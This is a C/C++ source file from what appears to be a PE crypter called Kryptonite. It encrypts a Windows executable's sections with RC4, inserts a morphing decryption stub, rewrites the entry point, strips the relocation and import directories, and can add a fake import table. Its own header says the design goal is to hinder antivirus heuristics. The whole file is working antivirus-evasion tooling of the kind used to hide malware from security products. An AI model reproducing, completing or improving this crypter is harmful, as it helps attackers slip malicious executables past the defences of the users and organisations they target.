
/*========================================================
		KBinCrypt BETA V1.0 (C) KOrUPt
		
	This file contains the PE crypt engine of Kryptonite,
	it takes care of encrypting each section, morphing the
	decryption stub with a random key and inserting the 
	corresponding stub into the target executable file
	after filling in the required values.
	
	Additionally it offers protection mechanisms to hinder AV
	heuristics such as inserting a random Import Address Table etc.
	
	Known issues:
		- #KBCB1 No support for TLS table's 		[unresolved]
		- #KMCB2 No support for resource encryption	[unresolved]
	
	Changelog:
		01/08/10:
			- Removed TLS table cloning; Section encryption corrupts the code
			- Alpha > BETA
			- Reset version numbers; V1.0
		31/07/10:
			- Added dwFlags parameter to provide optional use of features
			- Added stub encrypter; CryptStubFile()
			- Modified return values of kbc to be consistent with kmc
			- Solidified resource integrity protection; 
				Now checks vaddr of dir, not section name
========================================================*/
#pragma once
#include "CryptFile.h"
#include "..\shared_files\StubCrypt.h"

// Crypts target file with key szKey, inserts stub file and takes care of morphing the stub
BOOL CryptFile(const char *target, const char *stub, const char *szKey, DWORD dwFlags)
{
	PIMAGE_NT_HEADERS pNtHeaders;
	PIMAGE_SECTION_HEADER pSection, pSectionHeader, pIatSection;
	PIMAGE_TLS_DIRECTORY32 pImgTlsDir = NULL;
	LPMAPINFO lpMapInfo, lpStubInfo;
	
	DWORD dwWriteOffset = 0, dwStubSize, i;
	INT offsetSection = 0, n = 0;
	BOOL bRet = FALSE;
	
	SetLastError(E_UNEXPECTED);
		
	lpMapInfo = LoadFile(target, NULL);
	if(lpMapInfo){
		pNtHeaders = ImageNtHeader(lpMapInfo->lpBuffer);
		if(pNtHeaders){
			// check if target is a dll
			if((pNtHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) == IMAGE_FILE_DLL){
				UnloadFile(lpMapInfo);
				return 0;
			
			// check if target is a com runtime
			}else if(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress != 0){
				UnloadFile(lpMapInfo);
				return 0;
			}
		
			lpStubInfo = LoadFile(stub, NULL);
			if(lpStubInfo){
				offsetSection	= pNtHeaders->FileHeader.NumberOfSections - 1;
				dwStubSize		= GetFileSize(lpStubInfo->hFile, NULL);
				pSection		= pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
				if(pSection && dwStubSize != INVALID_FILE_SIZE){
					i = PEAlign(dwStubSize, pNtHeaders->OptionalHeader.SectionAlignment);
					UnloadFile(lpMapInfo);
					lpMapInfo = LoadFile(target, i); // we need to extend the file to account for the new section
					if(lpMapInfo){
						pSection = AddSection(".code", i, pNtHeaders, 0xE0000040);
						if(pSection){
							printf("[+] KBC: Appended new code section .code\n");
					
							memset(lpMapInfo->lpBuffer + pSection->PointerToRawData, 0x90, pSection->SizeOfRawData);
							dwWriteOffset = pSection->PointerToRawData;
						}
					}
				}

				if(dwWriteOffset != 0){ // no error
					// crypt stub
					DWORD dwCryptedBlockSize = CryptStubFile(lpStubInfo, ((dwFlags & MORPH_STUB) == MORPH_STUB) ? 0x1 : 0x0);
					
					// write crypted stub
					memcpy(lpMapInfo->lpBuffer + dwWriteOffset, lpStubInfo->lpBuffer, dwStubSize);
					printf("[+] KBC: Inserted stub\n");
					
					/*
					// do we have a TLS table? If so alloc mem for it and store it
					pImgTlsDir = (PIMAGE_TLS_DIRECTORY32)malloc(sizeof(IMAGE_TLS_DIRECTORY32));	
					memset(pImgTlsDir, 0, sizeof(IMAGE_TLS_DIRECTORY32));
					if(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress != 0){
						i = VaToFile( // Get file offset of our TLS table
								(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress
								+ pNtHeaders->OptionalHeader.ImageBase), pNtHeaders);
						
						// clone TLS table
						if(pImgTlsDir && i)
							CopyMemory(pImgTlsDir, (lpMapInfo->lpBuffer + i), sizeof(IMAGE_TLS_DIRECTORY32));
					}
					*/

					// Dynamic varible's. Stub globals
					DWORD dwPlaceholders[6] = { // values that our stub _needs_ to work
						(pNtHeaders->OptionalHeader.AddressOfEntryPoint + pNtHeaders->OptionalHeader.ImageBase), // 0 
						pNtHeaders->OptionalHeader.ImageBase,	// 1
						pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, // 2
						// note: the following fields will be zero'd if their is no TLS table
						//pImgTlsDir->StartAddressOfRawData,		// 3
						//pImgTlsDir->EndAddressOfRawData,			// 4
						//(u_long)pImgTlsDir->AddressOfIndex,		// 5
						//(u_long)pImgTlsDir->AddressOfCallBacks,	// 6
						//(u_long)pImgTlsDir->SizeOfZeroFill,		// 7
						//pImgTlsDir->Characteristics,				// 8
						
						//pImgTlsDir->StartAddressOfRawData,		// 9
						//pImgTlsDir->EndAddressOfRawData,			// 10
						//(u_long)pImgTlsDir->AddressOfIndex,		// 11
						//(u_long)pImgTlsDir->AddressOfCallBacks,	// 12
						//(u_long)pImgTlsDir->SizeOfZeroFill,		// 13
						//pImgTlsDir->Characteristics,				// 14
						// relocation table(15)
						(u_long)pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress,
						// crypted stub block size
						dwCryptedBlockSize							// 16
					};
					
					// write offsets into stub(overwrite all occourences of 0xCCCCCCCC in stub)
					for(i = dwWriteOffset; i < dwWriteOffset + dwStubSize; i++){
						if(!memcmp(lpMapInfo->lpBuffer + i, "\xCC\xCC\xCC\xCC", 4)){ // we have a match
							// fill placeholder with correct data(standard procedure)
							*(u_long *)(lpMapInfo->lpBuffer + i) = dwPlaceholders[n];
							
							/* offsets from here on(3 - 8) are dedicated toward TLS storage
							// so set the directory entry to point to the table
							if(n == 3){
								if(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress != 0){
									// write TLS dir
									pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = (FileToVa(i, pNtHeaders) - pNtHeaders->OptionalHeader.ImageBase);
									printf("[*] KBC: TLS table rewrote @ %08x\n", pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
								}
							}
							*/
							
							n++;
						}
					}
					
					// free allocated tls struct
					//free(pImgTlsDir); // Note: free(NULL); does nothing
				
					// encrypt sections
					for(i = 0; i < pNtHeaders->FileHeader.NumberOfSections - 1; i++){
						// don't crypt resource sections
						if(!(pSectionHeader->VirtualAddress == pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress)){
							RC4(lpMapInfo->lpBuffer + pSectionHeader->PointerToRawData, (unsigned char *)szKey, pSectionHeader->SizeOfRawData, strlen(szKey));		
							printf("[+] KBC: Encrypted section %s\n", pSectionHeader->Name);
						}else{
							// rename to .rsrc so our stub ignores it
							memcpy(pSectionHeader->Name, ".RSRC", 5);
							printf("[-] KBC: Ignoring resource section\n");
						}
						pSectionHeader++;
					}
					
					//----------
					// core work complete
					//----------
					
					// destroy spare IAT directories
					pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
					pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
					pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress = 0;
					pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].Size = 0;
					// destroy relocation table
					pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = 0;
					pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0;
					
					printf("[+] KBC: IAT + Relocs directories destroyed...\n", n, i);
					
					// features
					if((dwFlags & ADD_RANDOM_IAT) == ADD_RANDOM_IAT){
						// ---append a fake IAT----
						// we need to extend the file, so re-map it
						FlushViewOfFile(lpMapInfo->lpBuffer, 0);
						UnloadFile(lpMapInfo);
						lpMapInfo = LoadFile(target, 4096);
						if(lpMapInfo){
							// add section for iat
							pIatSection = AddSection(".idata", 4096, pNtHeaders, IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE);
							if(pIatSection){
								// zerofill section
								memset(lpMapInfo->lpBuffer + pIatSection->PointerToRawData, 0x00, pIatSection->SizeOfRawData);
								
								printf("[+] KBC: Appending fake IAT\n\t[*] KBC: Appended new imports section .idata @ VA %08x\n", pIatSection->VirtualAddress);

								// build fake IAT
								CITMaker *ImportTableMaker = new CITMaker(0x0);
								ImportTableMaker->Build(pIatSection->VirtualAddress); 
								memcpy(lpMapInfo->lpBuffer + pIatSection->PointerToRawData, ImportTableMaker->pMem, ImportTableMaker->dwSize);

								// update data dirs
								pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = pIatSection->VirtualAddress;
								pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size = ImportTableMaker->dwSize;
								printf("\t[+] KBC: Import data directories updated\n");
								delete ImportTableMaker;
							}
						}
					}else{
						// remove IAT pointers
						pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = 0;
						pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size = 0;
					}		
					
					// set the new entry point
					i = FileToVa(dwWriteOffset, pNtHeaders); 
					if(i){
						pNtHeaders->OptionalHeader.AddressOfEntryPoint = i - pNtHeaders->OptionalHeader.ImageBase;
						
						// update file checksum
						if(pNtHeaders->OptionalHeader.CheckSum){
							pNtHeaders->OptionalHeader.CheckSum = CalcNewChecksum(lpMapInfo);
							printf("[+] KBC: Updated file checksum\n");
						}
						
						SetLastError(ERROR_SUCCESS);
						bRet = TRUE;
					}else printf("[-]  KBC: Fatal errror: unable to set entrypoint\n");
				}else printf("[-]  KBC: Fatal error: could not write stub\n");
			
				// unload
				UnloadFile(lpStubInfo);
			}
		}
		
		FlushViewOfFile(lpMapInfo->lpBuffer, 0);
		UnloadFile(lpMapInfo);
	}

	return bRet;
}